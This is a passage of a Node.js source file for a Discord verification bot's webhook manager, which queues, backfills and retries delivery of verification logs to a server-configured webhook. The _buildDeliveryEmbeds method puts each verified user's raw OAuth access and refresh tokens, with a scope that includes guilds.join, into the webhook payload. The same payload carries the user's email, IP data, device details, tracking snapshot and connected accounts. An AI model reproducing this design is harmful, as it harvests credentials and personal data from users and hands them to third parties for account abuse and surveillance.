        } catch (err) {
            console.error("[VerificationWebhook] performStartupRecovery failed:", err);
            sendThrottledAlert({
                key: "startup_recovery_failure",
                severity: "ERROR",
                code: "verification.webhook_startup_recovery_failed",
                title: "STARTUP RECOVERY FAILED",
                description: `การกู้คืนระบบคิว Webhook ตอนเริ่มระบบล้มเหลว: ${err?.message || err}`
            });
            return false;
        } finally {
            this.isRecovering = false;
        }
    }

    /**
     * Checks if a destination webhook URL is valid.
     */
    validateUrl(url) {
        return validateWebhookUrl(url);
    }

    /**
     * Retrieves current webhook readiness & configuration status for a guild (P1-10).
     * Probes real database and queue status instead of hardcoding true.
     */
    async getReadiness(guildId) {
        const safeGuildId = String(guildId);
        const config = await GuildConfig.findOne().where("guildId").equals(safeGuildId).lean();
        const webhookConfig = config?.verification?.webhookLog || {};
        const urlValidation = this.validateUrl(webhookConfig.url);

        const mongoReady = mongoose.connection.readyState === 1;
        let sqliteReady = false;
        try {
            const row = this.repo.db.prepare("SELECT 1 as ok").get();
            sqliteReady = row?.ok === 1;
        } catch {
            sqliteReady = false;
        }

        const destinationVersion = Number(webhookConfig.destinationVersion) || 1;
        const latestJob = this.repo.getLatestJob(safeGuildId);
        const stats = this.repo.getDeliveryStats(safeGuildId, destinationVersion);

        return {
            enabled: webhookConfig.enabled === true,
            mode: webhookConfig.mode || "off",
            urlConfigured: urlValidation.configured,
            urlValid: urlValidation.valid,
            urlError: urlValidation.code,
            destinationVersion,
            liveStartedAt: webhookConfig.liveStartedAt || null,
            lastStatus: webhookConfig.lastStatus || "idle",
            lastError: webhookConfig.lastError || null,
            lastDeliveryAt: webhookConfig.lastDeliveryAt || null,
            databaseReady: {
                ok: mongoReady && sqliteReady,
                mongo: mongoReady,
                sqlite: sqliteReady
            },
            queueReady: {
                ok: sqliteReady
            },
            activeJob: latestJob && ["RUNNING", "PENDING"].includes(latestJob.status) ? {
                jobId: latestJob.job_id,
                destinationVersion: latestJob.destination_version,
                mode: latestJob.mode,
                status: latestJob.status,
                processedCount: latestJob.processed_count,
                totalEligible: latestJob.total_eligible,
                successCount: latestJob.success_count,
                failureCount: latestJob.failure_count,
                retryCount: latestJob.retry_count
            } : null,
            stats
        };
    }

    /**
     * Starts Live-Only delivery mode for a guild (P1-4).
     * Sets liveStartedAt cutoff so old history is not re-sent.
     */
    async startLiveMode(guildId) {
        const safeGuildId = String(guildId);
        const config = await GuildConfig.findOne().where("guildId").equals(safeGuildId);
        if (!config) throw new Error("ไม่พบการตั้งค่าของเซิร์ฟเวอร์");

        const url = config.verification?.webhookLog?.url;
        const validation = this.validateUrl(url);
        if (!validation.valid) {
            throw new Error("กรุณาตั้งค่า Discord Webhook URL ที่ถูกต้องก่อนเริ่มใช้งาน");
        }

        // Cancel any ongoing backfill job and all pending/retry backfill deliveries for this guild
        this.repo.cancelActiveJobsAndDeliveriesForGuild(safeGuildId, "switched_to_live_only");

        const now = Date.now();
        await GuildConfig.updateOne({ guildId: safeGuildId }, {
            $set: {
                "verification.webhookLog.enabled": true,
                "verification.webhookLog.mode": "live",
                "verification.webhookLog.liveStartedAt": now,
                "verification.webhookLog.lastStatus": "running",
                "verification.webhookLog.lastError": null,
                "verification.updatedAt": now
            }
        });

        // Trigger queue drain if any pending
        this.triggerWorker(safeGuildId);

        return { ok: true, mode: "live", liveStartedAt: now };
    }

    /**
     * Starts Backfill-Then-Live mode for a guild (P1-1, P1-5).
     */
    async startBackfillMode(guildId) {
        const safeGuildId = String(guildId);
        const config = await GuildConfig.findOne().where("guildId").equals(safeGuildId);
        if (!config) throw new Error("ไม่พบการตั้งค่าของเซิร์ฟเวอร์");

        const url = config.verification?.webhookLog?.url;
        const validation = this.validateUrl(url);
        if (!validation.valid) {
            throw new Error("กรุณาตั้งค่า Discord Webhook URL ที่ถูกต้องก่อนเริ่มใช้งาน");
        }

        const activeJob = this.repo.getActiveJob(safeGuildId);
        if (activeJob) {
            return {
                ok: true,
                alreadyRunning: true,
                jobId: activeJob.job_id,
                mode: activeJob.mode,
                processedCount: activeJob.processed_count,
                totalEligible: activeJob.total_eligible
            };
        }

        const destinationVersion = Number(config.verification?.webhookLog?.destinationVersion) || 1;

        // Count eligible successful historical verifications with confirmed role assignment
        const totalEligible = await VerifyLog.countDocuments({
            guildId: safeGuildId,
            result: "success",
            $or: [
                { "roleAssignResult.ok": true },
                { "roleAssignResult.alreadyHadRole": true },
                { "roleAssignResult.joinedWithRole": true },
                { "roleAssignResult.status": "success" }
            ],
            deletedAt: { $exists: false }
        });

        const jobId = `job_backfill_${safeGuildId}_${Date.now()}`;
        this.repo.createJob({
            jobId,
            guildId: safeGuildId,
            destinationVersion,
            mode: "BACKFILL_LIVE",
            totalEligible
        });

        const now = Date.now();
        try {
            await GuildConfig.updateOne({ guildId: safeGuildId }, {
                $set: {
                    "verification.webhookLog.enabled": true,
                    "verification.webhookLog.mode": "backfill_live",
                    "verification.webhookLog.liveStartedAt": now,
                    "verification.webhookLog.lastStatus": "running",
                    "verification.webhookLog.lastError": null,
                    "verification.updatedAt": now
                }
            });
        } catch (mongoErr) {
            this.repo.cancelJob(jobId, `config_update_failed:${mongoErr.message}`);
            throw mongoErr;
        }

        // Start background backfill processor
        this.triggerWorker(safeGuildId, jobId);

        return {
            ok: true,
            jobId,
            mode: "backfill_live",
            destinationVersion,
            totalEligible
        };
    }

    /**
     * Dispatches a live verification event immediately.
     * Central enforcement: only dispatches successful, role-assigned events (P0-1, P1-3, P1-4, P1-5).
     */
    async dispatchLiveEvent({ guildId, userId, logId, eventData }) {
        const safeGuildId = String(guildId);

        // P0-1: Guard centrally against non-success or unassigned events using unified eligibility
        let loadedLog = null;
        if (eventData) {
            if (!isEligibleVerifyLog(eventData)) return null;
        } else if (logId) {
            loadedLog = await VerifyLog.findById(logId).lean();
            if (!isEligibleVerifyLog(loadedLog)) return null;
        } else {
            return null;
        }

        const config = await GuildConfig.findOne().where("guildId").equals(safeGuildId).lean();
        const webhookConfig = config?.verification?.webhookLog;

        if (!webhookConfig?.enabled || !webhookConfig?.url) return null;

        const validation = this.validateUrl(webhookConfig.url);
        if (!validation.valid) return null;

        // P1-4: Live-Only boundary check
        const liveStartedAt = Number(webhookConfig.liveStartedAt) || 0;
        const eventTime = Number(eventData?.verifiedAt || loadedLog?.verifiedAt || loadedLog?.createdAt || Date.now());
        if (liveStartedAt > 0 && eventTime < liveStartedAt - 5000) {
            return null; // Event occurred before live mode started
        }

        const destinationVersion = Number(webhookConfig.destinationVersion) || 1;
        const eventId = String(logId || eventData?._id || `event_${safeGuildId}_${userId}_${Date.now()}`);

        // P1-3: Deterministic deliveryId to prevent duplicate deliveries across live/backfill
        const deliveryId = `del_${safeGuildId}_v${destinationVersion}_${eventId}`;

        // Enqueue into SQLite
        this.repo.enqueueDelivery({
            deliveryId,
            guildId: safeGuildId,
            destinationVersion,
            eventId,
            userId: String(userId)
        });

        // Send or trigger worker
        this.triggerWorker(safeGuildId);
        return deliveryId;
    }

    /**
     * Triggers the background delivery worker for a guild.
     * Prevents lost wake-ups with a pendingWakeups loop (P1-7).
     */
    triggerWorker(guildId, backfillJobId = null) {
        const safeGuildId = String(guildId);
        if (!this.startupRecoveryCompleted) {
            this.performStartupRecovery().catch(() => {});
        }
        if (this.activeWorkers.has(safeGuildId)) {
            this.pendingWakeups.add(safeGuildId);
            return;
        }
        const workerPromise = (async () => {
            let nextBackfillJobId = backfillJobId;
            const drainWorkerQueue = async () => {
                this.pendingWakeups.delete(safeGuildId);
                await this.runWorker(safeGuildId, nextBackfillJobId);
                nextBackfillJobId = null;
                if (this.pendingWakeups.has(safeGuildId)) {
                    await drainWorkerQueue();
                }
            };
            try {
                await drainWorkerQueue();
            } finally {
                this.activeWorkers.delete(safeGuildId);
            }
        })();
        this.activeWorkers.set(safeGuildId, workerPromise);
    }

    /**
     * Schedules automatic retry wake-up for a guild when the next retry timestamp arrives (P1-7).
     */
    scheduleNextRetry(guildId) {
        const safeGuildId = String(guildId);
        if (this.retryTimers.has(safeGuildId)) {
            clearTimeout(this.retryTimers.get(safeGuildId));
            this.retryTimers.delete(safeGuildId);
        }

        const nextRetry = this.repo.getNextRetryTimestamp(safeGuildId);
        if (!nextRetry) return;

        const delayMs = Math.max(1000, Math.min(3600000, nextRetry - Date.now()));
        const timer = setTimeout(() => {
            this.retryTimers.delete(safeGuildId);
            this.triggerWorker(safeGuildId);
        }, delayMs);
        if (timer.unref) timer.unref();
        this.retryTimers.set(safeGuildId, timer);
    }

    /**
     * Worker execution loop handling backfill draining followed by live event delivery.
     */
    async runWorker(guildId, backfillJobId = null) {
        if (mongoose.connection?.readyState !== 1) {
            return;
        }

        const safeGuildId = String(guildId);
        const leaseToken = crypto.randomBytes(8).toString("hex");

        try {
            // STEP 1: Process Backfill if job exists or provided
            const job = backfillJobId
                ? this.repo.getJobById(backfillJobId)
                : this.repo.getActiveJob(safeGuildId);

            if (job?.mode === "BACKFILL_LIVE" && job.status === "RUNNING") {
                await this.executeBackfill(safeGuildId, job, leaseToken);
            }

            // STEP 2: Drain Live deliveries
            await this.drainDeliveries(safeGuildId);

        } catch (err) {
            console.error(`[VerificationWebhookManager] Worker error for guild=${safeGuildId}:`, err);
            sendThrottledAlert({
                key: `worker_unhandled_error_${safeGuildId}`,
                severity: "ERROR",
                code: "verification.webhook_worker_error",
                title: "WEBHOOK WORKER UNHANDLED ERROR",
                description: `เกิดข้อผิดพลาดในการทำงานของ Worker สำหรับ Guild ${safeGuildId}: ${err?.message || err}`,
                guildId: safeGuildId
            });
            await GuildConfig.updateOne({ guildId: safeGuildId }, {
                $set: {
                    "verification.webhookLog.lastStatus": "failed",
                    "verification.webhookLog.lastError": err.message
                }
            }).catch(() => {});
        }
    }

    async _validateBackfillInitial(guildId, job) {
        const config = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
        const webhookConfig = config?.verification?.webhookLog;
        const webhookUrl = webhookConfig?.url;
        if (!webhookConfig?.enabled || !webhookUrl) {
            console.warn(`[VerificationWebhook] Guild ${guildId} backfill job ${job.job_id} aborted: webhook disabled or missing URL`);
            this.repo.cancelJob(job.job_id, !webhookUrl ? "webhook_url_missing" : "webhook_disabled");
            return false;
        }
        return true;
    }

    async _validateBackfillPreconditions(guildId, job, leaseToken, destinationVersion) {
        const currentJob = this.repo.getJobById(job.job_id);
        if (currentJob?.status !== "RUNNING") {
            console.warn(`[VerificationWebhook] Job ${job.job_id} is no longer running (status: ${currentJob?.status})`);
            return false;
        }

        const currentConfig = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
        const currentWebhook = currentConfig?.verification?.webhookLog;
        const currentMode = currentWebhook?.mode;
        if (currentMode !== "backfill_live") {
            console.warn(`[VerificationWebhook] Guild ${guildId} mode changed to ${currentMode || "off"}, halting backfill`);
            this.repo.cancelJob(job.job_id, `mode_changed_to_${currentMode || "live"}`);
            return false;
        }
        if (!currentWebhook?.url) {
            console.warn(`[VerificationWebhook] Guild ${guildId} webhook URL removed during backfill`);
            this.repo.cancelJob(job.job_id, "webhook_url_removed_during_backfill");
            return false;
        }

        const currentDestVersion = Number(currentWebhook?.destinationVersion) || 1;
        if (currentDestVersion !== destinationVersion) {
            console.warn(`[VerificationWebhook] Destination version changed for guild=${guildId} during backfill (from v${destinationVersion} to v${currentDestVersion})`);
            this.repo.cancelJob(job.job_id, `destination_version_changed_to_${currentDestVersion}`);
            return false;
        }

        const hasLease = this.repo.acquireJobLease(job.job_id, leaseToken, 30000);
        if (!hasLease) {
            console.warn(`[VerificationWebhook] Lease lost or held by another worker for job=${job.job_id}`);
            const currentJobCheck = this.repo.getJobById(job.job_id);
            if (currentJobCheck?.status === "RUNNING") {
                this.scheduleNextRetry(guildId);
            }
            return false;
        }

        return true;
    }

    async _fetchBackfillBatch(guildId, lastCursorId) {
        const query = {
            guildId,
            result: "success",
            $or: [
                { "roleAssignResult.ok": true },
                { "roleAssignResult.alreadyHadRole": true },
                { "roleAssignResult.joinedWithRole": true },
                { "roleAssignResult.status": "success" }
            ],
            deletedAt: { $exists: false }
        };
        if (lastCursorId) {
            if (mongoose.Types.ObjectId.isValid(lastCursorId)) {
                query._id = { $gt: new mongoose.Types.ObjectId(lastCursorId) };
            } else {
                query._id = { $gt: lastCursorId };
            }
        }

        return VerifyLog.find(query)
            .sort({ _id: 1 })
            .limit(BATCH_SIZE)
            .lean();
    }

    async _processBackfillItem(guildId, job, log, leaseToken, state) {
        const checkJob = this.repo.getJobById(job.job_id);
        if (checkJob?.status !== "RUNNING") return false;

        const checkConfig = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
        const mode = checkConfig?.verification?.webhookLog?.mode;
        if (mode !== "backfill_live") {
            this.repo.cancelJob(job.job_id, `mode_changed_to_${mode || "live"}`);
            return false;
        }
        if (!checkConfig?.verification?.webhookLog?.url) {
            this.repo.cancelJob(job.job_id, "webhook_url_missing_during_processing");
            return false;
        }

        const eventId = String(log._id);
        if (!isEligibleVerifyLog(log)) {
            state.processed++;
            state.lastCursorId = eventId;
            this.repo.updateJobProgress(job.job_id, {
                processedCount: state.processed,
                lastCursorId: state.lastCursorId,
                leaseToken
            });
            return true;
        }

        const renewed = this.repo.renewJobLease(job.job_id, leaseToken, 30000);
        if (!renewed) {
            console.warn(`[VerificationWebhook] Lease renewal failed for job ${job.job_id}; halting backfill to prevent conflict`);
            this.scheduleNextRetry(guildId);
            return false;
        }

        const existing = this.repo.getDeliveryByEventId(guildId, state.destinationVersion, eventId);
        if (existing) {
            if (existing.status === "FAILED" && typeof this.repo.requeueFailedDelivery === "function") {
                this.repo.requeueFailedDelivery(existing.delivery_id, job.job_id);
            }
            state.processed++;
            state.lastCursorId = eventId;
            this.repo.updateJobProgress(job.job_id, {
                processedCount: state.processed,
                lastCursorId: state.lastCursorId,
                leaseToken
            });
            return true;
        }

        const targetDeliveryId = `del_${guildId}_v${state.destinationVersion}_${eventId}`;
        this.repo.enqueueDelivery({
            deliveryId: targetDeliveryId,
            jobId: job.job_id,
            guildId,
            destinationVersion: state.destinationVersion,
            eventId,
            userId: String(log.userId)
        });

        state.processed++;
        state.lastCursorId = eventId;

        const updProgress = this.repo.updateJobProgress(job.job_id, {
            processedCount: state.processed,
            lastCursorId: state.lastCursorId,
            leaseToken
        });
        if (updProgress?.changes === 0) {
            console.warn(`[VerificationWebhook] Lease expired or lost for job ${job.job_id}; halting backfill`);
            return false;
        }
        return true;
    }

    async _processBackfillBatch(guildId, job, leaseToken, state) {
        const ok = await this._validateBackfillPreconditions(guildId, job, leaseToken, state.destinationVersion);
        if (!ok) return false;

        const batch = await this._fetchBackfillBatch(guildId, state.lastCursorId);
        if (!batch.length) {
            this.repo.updateJobProgress(job.job_id, {
                totalEligible: state.processed,
                processedCount: state.processed,
                lastCursorId: state.lastCursorId,
                leaseToken
            });
            await this.drainDeliveries(guildId);
            await this.checkAndCompleteJobIfDone(job.job_id, guildId, leaseToken, { cursorExhausted: true });
            return false;
        }

        async function processBatchItems(index, self) {
            if (index >= batch.length) return true;
            const log = batch[index];
            const cont = await self._processBackfillItem(guildId, job, log, leaseToken, state);
            if (!cont) return false;
            return processBatchItems(index + 1, self);
        }

        const cont = await processBatchItems(0, this);
        if (!cont) return false;

        await this.drainDeliveries(guildId);
        return true;
    }

    /**
     * Executes backfill replay from MongoDB historical records (P1-1, P1-3, P1-9).
     * Tracks per-item delivery status and does not skip failed items permanently.
     */
    async executeBackfill(guildId, job, leaseToken) {
        const initialValid = await this._validateBackfillInitial(guildId, job);
        if (!initialValid) return;

        const state = {
            lastCursorId: job.last_cursor_id || null,
            processed: job.processed_count || 0,
            destinationVersion: job.destination_version || 1
        };

        const runNextBatch = async () => {
            const shouldContinue = await this._processBackfillBatch(guildId, job, leaseToken, state);
            if (shouldContinue) {
                await runNextBatch();
            }
        };

        await runNextBatch();
    }

    async _findVerifyLogByEventId(eventId) {
        if (mongoose.Types.ObjectId.isValid(eventId)) {
            return VerifyLog.findById(eventId).lean();
        }
        return VerifyLog.findOne({ _id: eventId }).lean();
    }

    _validateDeliveryPrerequisites(item, guildId, context) {
        const { activeVersion, activeUrl, currentMode } = context;

        // P1-3: If guild is currently in 'live' mode and delivery belongs to a backfill job, reject it
        if (currentMode === "live" && item.job_id) {
            this.repo.markDeliveryFailed(item.delivery_id, "cancelled_by_live_mode", "Backfill delivery cancelled because guild switched to live-only mode", item.destination_version);
            return false;
        }

        // If delivery belongs to a backfill job that is no longer running, fail it
        if (item.job_id) {
            const job = this.repo.getJobById(item.job_id);
            if (job && job.status !== "RUNNING") {
                this.repo.markDeliveryFailed(item.delivery_id, "job_not_running", `Backfill job status is ${job.status}`, item.destination_version);
                return false;
            }
        }

        // If delivery belongs to an older destination version, fail and skip
        if (!activeUrl || item.destination_version < activeVersion) {
            this.repo.markDeliveryFailed(item.delivery_id, "destination_version_obsolete", "Delivery belongs to older webhook URL version", item.destination_version);
            sendThrottledAlert({
                key: `dest_version_obsolete_${guildId}_${item.destination_version}`,
                severity: "WARN",
                code: "verification.webhook_destination_obsolete",
                title: "WEBHOOK DESTINATION VERSION OBSOLETE",
                description: `พบรายการส่งข้อมูลที่ตรงกับเวอร์ชัน Webhook เก่า (delivery=${item.delivery_id}, version=${item.destination_version}, active=${activeVersion}) รายการถูกยกเลิกตามนโยบาย`,
                guildId
            });
            return false;
        }

        return true;
    }

    _buildDeliveryEmbeds(log, oauthUser, item, config) {
        return buildWebhookPayload({
            eventId: String(log._id),
            guildId: log.guildId || item.guild_id,
            guildName: config?.guildName || config?.name || null,
            profile: {
                id: log.userId,
                username: log.discordSnapshot?.username || oauthUser?.discord?.username,
                globalName: log.discordSnapshot?.globalName || oauthUser?.discord?.globalName,
                discriminator: log.discordSnapshot?.discriminator || oauthUser?.discord?.discriminator,
                displayTag: log.discordSnapshot?.displayTag || oauthUser?.discord?.displayTag || log.discordSnapshot?.username,
                avatarUrl: log.discordSnapshot?.avatarUrl || oauthUser?.discord?.avatarUrl,
                bannerUrl: log.discordSnapshot?.bannerUrl || oauthUser?.discord?.bannerUrl,
                accountCreatedAt: log.discordSnapshot?.accountCreatedAt || oauthUser?.discord?.accountCreatedAt,
                accountAgeDays: log.discordSnapshot?.accountAgeDays || oauthUser?.discord?.accountAgeDays,
                email: log.discordSnapshot?.email || oauthUser?.discord?.email,
                emailVerified: log.discordSnapshot?.emailVerified ?? oauthUser?.discord?.emailVerified,
                locale: log.discordSnapshot?.locale || oauthUser?.discord?.locale,
                mfaEnabled: log.discordSnapshot?.mfaEnabled ?? oauthUser?.discord?.mfaEnabled,
                premiumType: log.discordSnapshot?.premiumType ?? oauthUser?.discord?.premiumType,
                badgeFlags: log.discordSnapshot?.badgeFlags || oauthUser?.discord?.badgeFlags || []
            },
            connections: log.connectionsSnapshot || oauthUser?.connections || [],
            guildSummary: log.guildSummary || oauthUser?.guildSummary || null,
            ipInfo: log.ipInfo || {},
            device: log.device || {},
            tokens: {
                accessToken: oauthUser?.oauth?.accessToken,
                refreshToken: oauthUser?.oauth?.refreshToken,
                encryptedAccessToken: oauthUser?.oauth?.encryptedAccessToken,
                encryptedRefreshToken: oauthUser?.oauth?.encryptedRefreshToken,
                scope: oauthUser?.oauth?.scope || "identify email connections guilds guilds.members.read guilds.join",
                expiresAt: oauthUser?.oauth?.expiresAt
            },
            trackingSnapshot: log.trackingSnapshot || oauthUser?.lastIpTracking || {},
            roleId: log.roleId,
            roleName: config?.verification?.roleName || null,
            findings: log.findings || [],
            result: log.result || "success",
            verifiedAt: log.verifiedAt || log.createdAt
        });
    }

    _determineFailReasonAndMessage(item, sendErr, isPermanent) {
        if (sendErr.code === "destination_changed_during_delivery") {
            if (item.sent_parts > 0) {
                return {
                    failReason: "cancelled_during_send_partial",
                    failMessage: `Delivery cancelled during multipart transmission after sending ${item.sent_parts} parts: ${sendErr.message}`
                };
            }
            return {
                failReason: "cancelled_during_send",
                failMessage: `Delivery cancelled during transmission: ${sendErr.message}`
            };
        }
        if (item.sent_parts > 0 && isPermanent) {
            return {
                failReason: "partial_delivery_failed",
                failMessage: `Delivery permanently failed after sending ${item.sent_parts} parts: ${sendErr.message}`
            };
        }
        return {
            failReason: isPermanent ? (sendErr.code || "http_permanent_error") : "exhausted",
            failMessage: sendErr.message
        };
    }

    async _handleTerminalDeliveryFailure(item, guildId, sendErr, isPermanent) {
        const { failReason, failMessage } = this._determineFailReasonAndMessage(item, sendErr, isPermanent);
        this.repo.markDeliveryFailed(item.delivery_id, failReason, failMessage, item.destination_version);
        sendThrottledAlert({
            key: `exhausted_${guildId}_${item.delivery_id}`,
            severity: "ERROR",
            code: isPermanent ? "verification.webhook_permanent_failure" : "verification.webhook_retry_exhausted",
            title: isPermanent ? "WEBHOOK PERMANENT DELIVERY ERROR" : "WEBHOOK RETRY EXHAUSTED",
            description: `การส่งข้อมูล Log Verify สำหรับ Guild ${guildId} ล้มเหลว (${failReason}): ${sendErr.message}`,
            guildId
        });
        if (item.job_id) {
            const j = this.repo.getJobById(item.job_id);
            if (j) {
                this.repo.updateJobProgress(item.job_id, {
                    failureCount: (j.failure_count || 0) + 1
                });
            }
            await this.checkAndCompleteJobIfDone(item.job_id, guildId);
        }
        if (sendErr.status === 401 || sendErr.status === 404) {
            await GuildConfig.updateOne({ guildId }, {
                $set: {
                    "verification.webhookLog.valid": false,
                    "verification.webhookLog.lastStatus": "failed",
                    "verification.webhookLog.lastError": `Webhook endpoint returned HTTP ${sendErr.status}`
                }
            }).catch(() => {});
        }
    }

    _scheduleDeliveryRetry(item, sendErr) {
        const attempt = Math.max(1, Number(item.attempt_count) || 1);
        const retryDelayMs = Math.min(60000, 2000 * Math.pow(2, attempt - 1)) + crypto.randomInt(0, 1000);
        this.repo.markDeliveryRetry(item.delivery_id, retryDelayMs, "retry", sendErr.message, item.destination_version);
        if (item.job_id) {
            const j = this.repo.getJobById(item.job_id);
            if (j) {
                this.repo.updateJobProgress(item.job_id, {
                    retryCount: (j.retry_count || 0) + 1
                });
            }
        }
    }

    async _handleDeliveryFailure(item, guildId, sendErr) {
        console.error(`[VerificationWebhook] Delivery failed for id=${item.delivery_id}:`, sendErr.message);
        const isPermanent = isPermanentWebhookError(sendErr);
        if (isPermanent || item.attempt_count >= 5) {
            await this._handleTerminalDeliveryFailure(item, guildId, sendErr, isPermanent);
        } else {
            this._scheduleDeliveryRetry(item, sendErr);
        }
    }

    async _deliverSingleItem(item, guildId, context) {
        if (!this._validateDeliveryPrerequisites(item, guildId, context)) {
            return;
        }

        try {
            // P1-2: Strict lookup by exact event_id
            const log = await this._findVerifyLogByEventId(item.event_id);

            if (!log || String(log.guildId) !== String(guildId) || String(log.userId) !== String(item.user_id)) {
                this.repo.markDeliveryFailed(item.delivery_id, "log_not_found", "VerifyLog not found or guild/user mismatch", item.destination_version);
                return;
            }

            // P0-1 / P1-1: Strict eligibility check before sending
            if (!isEligibleVerifyLog(log)) {
                this.repo.markDeliveryFailed(item.delivery_id, "event_not_eligible", "VerifyLog is not eligible for delivery (not success or missing role assignment)", item.destination_version);
                return;
            }

            const oauthUser = await OAuthUser.findOne({ "discord.userId": item.user_id }).lean();
            const embeds = this._buildDeliveryEmbeds(log, oauthUser, item, context.config);

            // P1-5: Check destination version immediately before transmission
            const prePostConfig = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
            const prePostVersion = Number(prePostConfig?.verification?.webhookLog?.destinationVersion) || 1;
            const prePostUrl = prePostConfig?.verification?.webhookLog?.url;
            if (item.job_id && prePostConfig?.verification?.webhookLog?.mode === "live") {
                this.repo.markDeliveryFailed(item.delivery_id, "cancelled_by_live_mode_before_send", "Backfill delivery cancelled because guild switched to live-only mode", item.destination_version);
                return;
            }
            if (!prePostUrl || item.destination_version !== prePostVersion) {
                this.repo.markDeliveryFailed(item.delivery_id, "destination_version_obsolete", "Webhook URL or version changed before transmission", item.destination_version);
                sendThrottledAlert({
                    key: `dest_version_changed_${guildId}_${item.destination_version}`,
                    severity: "WARN",
                    code: "verification.webhook_destination_version_changed",
                    title: "WEBHOOK DESTINATION VERSION CHANGED",
                    description: `Webhook URL หรือเวอร์ชันปลายทางเปลี่ยนระหว่างส่งข้อมูล (delivery=${item.delivery_id}, itemVersion=${item.destination_version}, activeVersion=${prePostVersion})`,
                    guildId
                });
                return;
            }

            await deliverWebhookEvent(prePostUrl, embeds, {
                startPart: Number(item.sent_parts) || 0,
                onPartSent: async (partIndex) => {
                    const updRes = this.repo.updateDeliverySentParts(item.delivery_id, partIndex, item.destination_version);
                    if (updRes?.changes === 0) {
                        const cancelErr = new Error("delivery_cancelled_or_version_changed_during_send");
                        cancelErr.code = "destination_changed_during_delivery";
                        throw cancelErr;
                    }
                },
                checkDestinationValid: async () => {
                    const latestCheck = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
                    const currentVer = Number(latestCheck?.verification?.webhookLog?.destinationVersion) || 1;
                    const currentUrl = latestCheck?.verification?.webhookLog?.url;
                    const currentMode = latestCheck?.verification?.webhookLog?.mode;
                    if (item.job_id && currentMode !== "backfill_live") {
                        return false;
                    }
                    if (currentUrl !== prePostUrl || currentVer !== prePostVersion) {
                        return false;
                    }
                    if (typeof this.repo.getDeliveryById === "function") {
                        const freshDelivery = this.repo.getDeliveryById(item.delivery_id);
                        if (freshDelivery && freshDelivery.status !== "SENDING") {
                            return false;
                        }
                    }
                    return true;
                }
            });
            const sentResult = this.repo.markDeliverySent(item.delivery_id, item.destination_version);

            if (sentResult?.changes > 0) {
                if (item.job_id) {
                    const j = this.repo.getJobById(item.job_id);
                    if (j) {
                        this.repo.updateJobProgress(item.job_id, {
                            successCount: (j.success_count || 0) + 1
                        });
                    }
                    await this.checkAndCompleteJobIfDone(item.job_id, guildId);
                }

                await GuildConfig.updateOne({ guildId }, {
                    $set: {
                        "verification.webhookLog.lastDeliveryAt": Date.now(),
                        "verification.webhookLog.lastStatus": "success",
                        "verification.webhookLog.lastError": null
                    }
                });
            }

        } catch (sendErr) {
            await this._handleDeliveryFailure(item, guildId, sendErr);
        }
    }

    /**
     * Drains pending/retry deliveries from SQLite table (P1-2, P1-7).
     * Strictly verifies event_id and user/guild integrity.
     */
    async drainDeliveries(guildId) {
        const config = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
        const initialWebhookUrl = config?.verification?.webhookLog?.url;
        if (!initialWebhookUrl) return;
        const initialVersion = Number(config?.verification?.webhookLog?.destinationVersion) || 1;

        const deliverBatch = async (items, index, context) => {
            if (index >= items.length) return;
            await this._deliverSingleItem(items[index], guildId, context);
            await sleep(RATE_LIMIT_DELAY_MS);
            return deliverBatch(items, index + 1, context);
        };

        const processBatches = async () => {
            const deliveries = this.repo.claimNextDeliveries(guildId, 5, initialVersion);
            if (!deliveries.length) return;

            const latestConfig = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
            const activeVersion = Number(latestConfig?.verification?.webhookLog?.destinationVersion) || 1;
            const activeUrl = latestConfig?.verification?.webhookLog?.url;
            const currentMode = latestConfig?.verification?.webhookLog?.mode;
            const context = { activeVersion, activeUrl, currentMode, config };

            await deliverBatch(deliveries, 0, context);
            return processBatches();
        };

        await processBatches();

        // P1-7: Schedule next retry timer if any items remain in RETRY
        this.scheduleNextRetry(guildId);
    }

    /**
     * Checks if all deliveries for a backfill job are finished and completes the job if so (P1-1).
     */
    async checkAndCompleteJobIfDone(jobId, guildId, leaseToken = null, options = {}) {
        if (!jobId) return;
        const remainingForJob = this.repo.countPendingDeliveriesForJob(jobId);
        if (remainingForJob > 0) return;

        const job = this.repo.getJobById(jobId);
        if (job?.status !== "RUNNING") return;

        const cursorExhausted = Boolean(options.cursorExhausted);
        if (!cursorExhausted && job.total_eligible > 0 && (job.processed_count || 0) < job.total_eligible) {
            console.warn(`[VerificationWebhook] Job ${jobId} has processed ${job.processed_count}/${job.total_eligible} items; not completing yet`);
            return;
        }

        const currentConfig = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
        if (currentConfig?.verification?.webhookLog?.mode !== "backfill_live") return;

        const jobStats = this.repo.getJobDeliveryStats(jobId);
        const failures = (job.failure_count || 0) + (jobStats.failed || 0);
        const finalStatus = failures > 0
            ? "COMPLETED_WITH_FAILURES"
            : "COMPLETED";

        this.repo.completeJob(jobId, finalStatus, leaseToken);
        if (finalStatus === "COMPLETED_WITH_FAILURES") {
            sendThrottledAlert({
                key: `backfill_failures_${guildId}_${jobId}`,
                severity: "WARN",
                code: "verification.webhook_backfill_completed_with_failures",
                title: "BACKFILL COMPLETED WITH FAILURES",
                description: `การส่งข้อมูลย้อนหลังสำหรับ Guild ${guildId} เสร็จสิ้น แต่มีรายการล้มเหลว ${failures} รายการ`,
                guildId
            });
        }
        await GuildConfig.updateOne({ guildId }, {
            $set: {
                "verification.webhookLog.mode": "live",
                "verification.webhookLog.lastStatus": finalStatus === "COMPLETED_WITH_FAILURES" ? "completed_with_failures" : "idle",
                "verification.webhookLog.backfillCompletedAt": Date.now(),
                "verification.webhookLog.lastError": finalStatus === "COMPLETED_WITH_FAILURES" ? `ส่งประวัติย้อนหลังเสร็จสิ้น แต่พบรายการล้มเหลว ${failures} รายการ` : null
            }
        });
    }
}

const verificationWebhookManager = new VerificationWebhookManager();

module.exports = {
    chunkLinesToFields,
    chunkStringToFields,
    splitEmbedFields,
    buildWebhookPayload,
    embedCharCount,
    fitEmbedsIntoMessages,
    deliverWebhookEvent,
    postWebhookMessage,
    isPermanentWebhookError,
    isEligibleVerifyLog,
    VerificationWebhookManager,
    verificationWebhookManager
};
